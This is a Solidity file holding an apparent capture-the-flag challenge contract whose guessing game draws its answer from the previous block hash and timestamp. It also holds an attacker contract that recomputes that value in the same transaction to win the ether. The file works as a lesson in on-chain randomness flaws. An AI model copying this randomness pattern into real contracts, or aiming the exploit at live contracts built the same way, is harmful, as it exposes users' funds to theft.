pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

interface IGuessTheNewNumber {
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    function attack(address challengeAddress) external payable {
        require(msg.value == 1 ether);
        
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));
        

        IGuessTheNewNumber(challengeAddress).guess.value(1 ether)(answer);

    }
    
    function() public payable {} // Fallback to receive ETH
}  